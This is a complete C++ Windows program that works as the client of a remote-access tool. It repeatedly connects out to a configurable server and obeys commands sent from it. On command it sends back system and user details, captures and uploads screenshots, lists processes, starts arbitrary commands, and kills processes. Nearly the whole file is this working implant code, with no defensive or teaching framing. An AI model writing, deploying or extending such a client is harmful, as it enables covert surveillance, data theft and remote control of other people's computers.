#include <iostream>
#include <string>
#include <vector>
#include <cstring>
#include <winsock2.h> // Include winsock2.h before windows.h
#include <windows.h>
#include <ws2tcpip.h>
#include <objidl.h>   // For IStream
#include <gdiplus.h>  // Add GDI+ for screenshot capability
#include <memory>     // For smart pointers
#include <tlhelp32.h> // For process management functions

// Link with required libraries
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "ws2_32.lib")

// Use Gdiplus namespace
using namespace Gdiplus;

#define PORT 8888
#define BUFFER_SIZE 1024
#define SERVER_IP "127.0.0.1" // Change to your server IP

// Get detailed system information
std::string get_sysinfo()
{
    SYSTEM_INFO sysInfo;
    OSVERSIONINFOEX osInfo;
    MEMORYSTATUSEX memInfo;
    char computerName[MAX_COMPUTERNAME_LENGTH + 1];
    char userName[256];
    DWORD size = sizeof(computerName);
    DWORD userSize = sizeof(userName);
    ULARGE_INTEGER freeBytesAvailable, totalBytes, totalFreeBytes;
    char ipAddress[46]; // IPv4 or IPv6

    // Get computer name
    GetComputerNameA(computerName, &size);

    // Get username
    GetUserNameA(userName, &userSize);

    // Get system info
    GetSystemInfo(&sysInfo);

    // Get OS version info
    ZeroMemory(&osInfo, sizeof(OSVERSIONINFOEX));
    osInfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);

    // Note: GetVersionEx is deprecated, but still works for basic info
    GetVersionEx((OSVERSIONINFO *)&osInfo);

    // Get memory info
    memInfo.dwLength = sizeof(MEMORYSTATUSEX);
    GlobalMemoryStatusEx(&memInfo);

    // Get disk info
    GetDiskFreeSpaceExW(L"C:\\", &freeBytesAvailable, &totalBytes, &totalFreeBytes);

    // Get IP address (simplified)
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);

    char hostName[256];
    gethostname(hostName, sizeof(hostName));

    struct addrinfo hints, *res;
    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;

    getaddrinfo(hostName, NULL, &hints, &res);

    void *addr;
    if (res->ai_family == AF_INET)
    {
        struct sockaddr_in *ipv4 = (struct sockaddr_in *)res->ai_addr;
        addr = &(ipv4->sin_addr);
    }
    else
    {
        struct sockaddr_in6 *ipv6 = (struct sockaddr_in6 *)res->ai_addr;
        addr = &(ipv6->sin6_addr);
    }

    inet_ntop(res->ai_family, addr, ipAddress, sizeof(ipAddress));
    freeaddrinfo(res);

    // Get processor architecture
    std::string arch;
    switch (sysInfo.wProcessorArchitecture)
    {
    case PROCESSOR_ARCHITECTURE_AMD64:
        arch = "x64 (AMD or Intel)";
        break;
    case PROCESSOR_ARCHITECTURE_ARM:
        arch = "ARM";
        break;
    case PROCESSOR_ARCHITECTURE_ARM64:
        arch = "ARM64";
        break;
    case PROCESSOR_ARCHITECTURE_INTEL:
        arch = "x86 (Intel)";
        break;
    default:
        arch = "Unknown";
    }

    // Format the information
    char info[BUFFER_SIZE];
    snprintf(info, BUFFER_SIZE,
             "=== DETAILED SYSTEM INFORMATION ===\n\n"
             "=== SYSTEM ===\n"
             "OS: Windows %d.%d (Build %d)\n"
             "Service Pack: %s\n"
             "Computer Name: %s\n"
             "Username: %s\n\n"

             "=== PROCESSOR ===\n"
             "Architecture: %s\n"
             "Number of Processors: %d\n"
             "Processor Level: %d\n"
             "Processor Revision: %d\n\n"

             "=== MEMORY ===\n"
             "Memory Load: %d%%\n"
             "Total Physical Memory: %.2f GB\n"
             "Available Physical Memory: %.2f GB\n"
             "Total Virtual Memory: %.2f GB\n"
             "Available Virtual Memory: %.2f GB\n\n"

             "=== DISK ===\n"
             "Total Disk Space (C:): %.2f GB\n"
             "Free Disk Space (C:): %.2f GB\n"
             "Disk Usage: %.2f%%\n\n"

             "=== NETWORK ===\n"
             "Host Name: %s\n"
             "IP Address: %s\n",

             osInfo.dwMajorVersion, osInfo.dwMinorVersion, osInfo.dwBuildNumber,
             osInfo.szCSDVersion,
             computerName,
             userName,

             arch.c_str(),
             sysInfo.dwNumberOfProcessors,
             sysInfo.wProcessorLevel,
             sysInfo.wProcessorRevision,

             memInfo.dwMemoryLoad,
             (double)memInfo.ullTotalPhys / (1024 * 1024 * 1024),
             (double)memInfo.ullAvailPhys / (1024 * 1024 * 1024),
             (double)memInfo.ullTotalVirtual / (1024 * 1024 * 1024),
             (double)memInfo.ullAvailVirtual / (1024 * 1024 * 1024),

             (double)totalBytes.QuadPart / (1024 * 1024 * 1024),
             (double)totalFreeBytes.QuadPart / (1024 * 1024 * 1024),
             100.0 - ((double)totalFreeBytes.QuadPart / totalBytes.QuadPart * 100.0),

             hostName,
             ipAddress);

    WSACleanup();
    return std::string(info);
}

// Helper function to get encoder CLSID
int GetEncoderClsid(const WCHAR *format, CLSID *pClsid)
{
    UINT num = 0;  // number of image encoders
    UINT size = 0; // size of the image encoder array in bytes

    GetImageEncodersSize(&num, &size);
    if (size == 0)
        return -1;

    std::unique_ptr<ImageCodecInfo[]> pImageCodecInfo(new ImageCodecInfo[size]);
    if (pImageCodecInfo == nullptr)
        return -1;

    GetImageEncoders(num, size, pImageCodecInfo.get());

    for (UINT j = 0; j < num; ++j)
    {
        if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0)
        {
            *pClsid = pImageCodecInfo[j].Clsid;
            return j;
        }
    }

    return -1;
}

// Function to capture and send screenshot
bool capture_and_send_screenshot(SOCKET sock)
{
    // Initialize GDI+
    ULONG_PTR gdiplusToken;
    GdiplusStartupInput gdiplusStartupInput;
    gdiplusStartupInput.GdiplusVersion = 1;
    gdiplusStartupInput.DebugEventCallback = NULL;
    gdiplusStartupInput.SuppressBackgroundThread = FALSE;
    gdiplusStartupInput.SuppressExternalCodecs = FALSE;
    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

    // Get screen dimensions
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);

    // Create compatible DC and bitmap
    HDC screenDC = GetDC(NULL);
    HDC memDC = CreateCompatibleDC(screenDC);
    HBITMAP hBitmap = CreateCompatibleBitmap(screenDC, screenWidth, screenHeight);
    HBITMAP hOldBitmap = (HBITMAP)SelectObject(memDC, hBitmap);

    // Copy screen to bitmap
    BitBlt(memDC, 0, 0, screenWidth, screenHeight, screenDC, 0, 0, SRCCOPY);

    // Save bitmap to memory using GDI+
    Bitmap *bitmap = nullptr;
    bitmap = new Bitmap(hBitmap, NULL);

    // Create a memory stream
    IStream *stream = nullptr;
    CreateStreamOnHGlobal(NULL, TRUE, &stream);

    // Save bitmap to stream as PNG
    CLSID pngClsid;
    GetEncoderClsid(L"image/png", &pngClsid);
    bitmap->Save(stream, &pngClsid, NULL);

    // Get stream size and reset position
    LARGE_INTEGER liZero = {0};
    ULARGE_INTEGER ulSize;
    stream->Seek(liZero, STREAM_SEEK_END, &ulSize);
    stream->Seek(liZero, STREAM_SEEK_SET, NULL);

    // Get stream data
    DWORD streamSize = (DWORD)ulSize.QuadPart;
    std::vector<BYTE> buffer(streamSize);
    ULONG bytesRead;
    stream->Read(buffer.data(), streamSize, &bytesRead);

    // First send the file size
    uint64_t size = streamSize;
    uint8_t size_bytes[8];
    for (int i = 0; i < 8; i++)
    {
        size_bytes[7 - i] = (size >> (i * 8)) & 0xFF;
    }
    send(sock, (char *)size_bytes, 8, 0);

    // Then send the file data
    int total_sent = 0;
    while (total_sent < streamSize)
    {
        int chunk_size = (streamSize - total_sent < 1024) ? static_cast<int>(streamSize - total_sent) : 1024;
        int sent = send(sock, (char *)buffer.data() + total_sent, chunk_size, 0);
        if (sent <= 0)
        {
            break;
        }
        total_sent += sent;
    }

    // Clean up
    stream->Release();
    delete bitmap;
    SelectObject(memDC, hOldBitmap);
    DeleteObject(hBitmap);
    DeleteDC(memDC);
    ReleaseDC(NULL, screenDC);
    GdiplusShutdown(gdiplusToken);

    return (total_sent == streamSize);
}

// Add this function to get process information
std::string get_process_info()
{
    std::string info = "Process Information:\n";

    // Get current process ID
    DWORD pid = GetCurrentProcessId();
    info += "Process ID (PID): " + std::to_string(pid) + "\n";

    // Get process name
    char process_name[MAX_PATH] = {0};
    DWORD size = MAX_PATH;
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);

    if (hProcess)
    {
        if (QueryFullProcessImageNameA(hProcess, 0, process_name, &size))
        {
            // Extract just the filename from the full path
            char *filename = strrchr(process_name, '\\');
            if (filename)
            {
                filename++; // Skip the backslash
            }
            else
            {
                filename = process_name;
            }
            info += "Process Name: " + std::string(filename) + "\n";
        }
        else
        {
            info += "Process Name: Unable to retrieve\n";
        }

        // Get process creation time
        FILETIME ftCreate, ftExit, ftKernel, ftUser;
        if (GetProcessTimes(hProcess, &ftCreate, &ftExit, &ftKernel, &ftUser))
        {
            SYSTEMTIME stCreate;
            FileTimeToSystemTime(&ftCreate, &stCreate);

            char timeStr[100];
            sprintf(timeStr, "%04d-%02d-%02d %02d:%02d:%02d",
                    stCreate.wYear, stCreate.wMonth, stCreate.wDay,
                    stCreate.wHour, stCreate.wMinute, stCreate.wSecond);

            info += "Process Start Time: " + std::string(timeStr) + "\n";
        }

        CloseHandle(hProcess);
    }
    else
    {
        info += "Failed to open process for detailed information\n";
    }

    // Get command line
    LPWSTR cmdLine = GetCommandLineW();
    if (cmdLine)
    {
        // Convert wide string to narrow string
        int size_needed = WideCharToMultiByte(CP_UTF8, 0, cmdLine, -1, NULL, 0, NULL, NULL);
        std::string cmdLineStr(size_needed, 0);
        WideCharToMultiByte(CP_UTF8, 0, cmdLine, -1, &cmdLineStr[0], size_needed, NULL, NULL);
        cmdLineStr.resize(strlen(cmdLineStr.c_str()));

        info += "Command Line: " + cmdLineStr + "\n";
    }

    // Get current directory
    char curDir[MAX_PATH];
    if (GetCurrentDirectoryA(MAX_PATH, curDir))
    {
        info += "Current Directory: " + std::string(curDir) + "\n";
    }

    // Get username
    char username[256];
    DWORD username_len = 256;
    if (GetUserNameA(username, &username_len))
    {
        info += "Running as User: " + std::string(username) + "\n";
    }

    return info;
}

// Add these functions for process management

// List all running processes
std::string list_processes()
{
    std::string process_list = "Running Processes:\n";
    process_list += "PID\tProcess Name\n";
    process_list += "------------------------\n";

    // Take a snapshot of all processes
    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE)
    {
        return "Failed to create process snapshot";
    }

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    // Get the first process
    if (!Process32First(hProcessSnap, &pe32))
    {
        CloseHandle(hProcessSnap);
        return "Failed to get process information";
    }

    // Iterate through all processes
    do
    {
        // Convert wide string to narrow string
        char narrow_name[MAX_PATH];
        WideCharToMultiByte(CP_UTF8, 0, pe32.szExeFile, -1, narrow_name, MAX_PATH, NULL, NULL);
        process_list += std::to_string(pe32.th32ProcessID) + "\t" + std::string(narrow_name) + "\n";
    } while (Process32Next(hProcessSnap, &pe32));

    CloseHandle(hProcessSnap);
    return process_list;
}

// Start a new process
std::string start_process(const std::string &command)
{
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    // Create a non-const copy of the command string
    char *cmd = _strdup(command.c_str());

    // Start the process
    if (!CreateProcessA(NULL, cmd, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi))
    {
        free(cmd);
        return "Failed to start process: " + std::to_string(GetLastError());
    }

    free(cmd);

    // Close process and thread handles
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return "Process started successfully with PID: " + std::to_string(pi.dwProcessId);
}

// Terminate a process by PID
std::string terminate_process(const std::string &pid_str)
{
    try
    {
        DWORD pid = std::stoi(pid_str);
        HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pid);

        if (hProcess == NULL)
        {
            return "Failed to open process with PID " + pid_str + ": " + std::to_string(GetLastError());
        }

        if (!TerminateProcess(hProcess, 1))
        {
            CloseHandle(hProcess);
            return "Failed to terminate process with PID " + pid_str + ": " + std::to_string(GetLastError());
        }

        CloseHandle(hProcess);
        return "Process with PID " + pid_str + " terminated successfully";
    }
    catch (const std::exception &e)
    {
        return "Error: " + std::string(e.what());
    }
}

int main()
{
    // Initialize GDI+ at startup
    ULONG_PTR gdiplusToken;
    Gdiplus::GdiplusStartupInput gdiplusStartupInput;
    gdiplusStartupInput.GdiplusVersion = 1;
    gdiplusStartupInput.DebugEventCallback = NULL;
    gdiplusStartupInput.SuppressBackgroundThread = FALSE;
    gdiplusStartupInput.SuppressExternalCodecs = FALSE;
    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

    WSADATA wsaData;
    SOCKET sock = INVALID_SOCKET;
    struct sockaddr_in serv_addr;
    char buffer[BUFFER_SIZE] = {0};
    std::string response;

    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
    {
        std::cout << "WSAStartup failed" << std::endl;
        return 1;
    }

    while (true)
    {
        // Create socket
        if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
        {
            std::cout << "Socket creation error: " << WSAGetLastError() << std::endl;
            Sleep(5000); // Use Sleep() on Windows (milliseconds)
            continue;
        }

        // Configure server address
        memset(&serv_addr, 0, sizeof(serv_addr));
        serv_addr.sin_family = AF_INET;
        serv_addr.sin_port = htons(PORT);

        // Convert IP address from text to binary
        if (inet_pton(AF_INET, SERVER_IP, &serv_addr.sin_addr) <= 0)
        {
            std::cout << "Invalid address or address not supported" << std::endl;
            closesocket(sock); // Use closesocket() on Windows
            Sleep(5000);
            continue;
        }

        // Connect to server
        std::cout << "Attempting to connect to server..." << std::endl;
        if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0)
        {
            std::cout << "Connection failed: " << WSAGetLastError() << std::endl;
            closesocket(sock);
            Sleep(5000);
            continue;
        }

        std::cout << "Connected to server" << std::endl;

        // Command processing loop
        while (true)
        {
            memset(buffer, 0, BUFFER_SIZE);
            int bytes_read = recv(sock, buffer, BUFFER_SIZE, 0);

            if (bytes_read <= 0)
            {
                std::cout << "Server disconnected" << std::endl;
                break;
            }

            std::cout << "Received command: " << buffer << std::endl;

            // Process commands
            if (strcmp(buffer, "sysinfo") == 0)
            {
                response = get_sysinfo();
                send(sock, response.c_str(), response.length(), 0);
            }
            else if (strcmp(buffer, "procinfo") == 0)
            {
                std::cout << "Sending process information..." << std::endl;
                response = get_process_info();
                send(sock, response.c_str(), response.length(), 0);
            }
            else if (strcmp(buffer, "list_processes") == 0)
            {
                std::cout << "Listing all processes..." << std::endl;
                response = list_processes();
                send(sock, response.c_str(), response.length(), 0);
            }
            else if (strncmp(buffer, "start_process ", 14) == 0)
            {
                std::string command = buffer + 14;
                std::cout << "Starting process: " << command << std::endl;
                response = start_process(command);
                send(sock, response.c_str(), response.length(), 0);
            }
            else if (strncmp(buffer, "terminate_process ", 18) == 0)
            {
                std::string pid = buffer + 18;
                std::cout << "Terminating process with PID: " << pid << std::endl;
                response = terminate_process(pid);
                send(sock, response.c_str(), response.length(), 0);
            }
            else if (strcmp(buffer, "screenshot") == 0)
            {
                std::cout << "Taking screenshot..." << std::endl;
                if (!capture_and_send_screenshot(sock))
                {
                    const char *error_msg = "Failed to capture screenshot";
                    send(sock, error_msg, strlen(error_msg), 0);
                }
                std::cout << "Screenshot sent" << std::endl;
            }
            else if (strcmp(buffer, "kill_client") == 0)
            {
                std::cout << "Received kill command from server. Terminating..." << std::endl;
                // Send acknowledgment before terminating
                const char *ack_msg = "Client terminating on server request";
                send(sock, ack_msg, strlen(ack_msg), 0);

                // Clean up resources
                closesocket(sock);
                WSACleanup();
                GdiplusShutdown(gdiplusToken);

                // Force exit the process
                ExitProcess(0);
            }
            else if (strcmp(buffer, "exit") == 0)
            {
                std::cout << "Exiting..." << std::endl;
                closesocket(sock);
                WSACleanup();
                GdiplusShutdown(gdiplusToken);
                return 0;
            }
            else
            {
                response = "Unknown command";
                send(sock, response.c_str(), response.length(), 0);
            }
        }

        closesocket(sock);
        Sleep(5000); // Wait before reconnecting
    }

    GdiplusShutdown(gdiplusToken);
    WSACleanup();
    return 0;
}
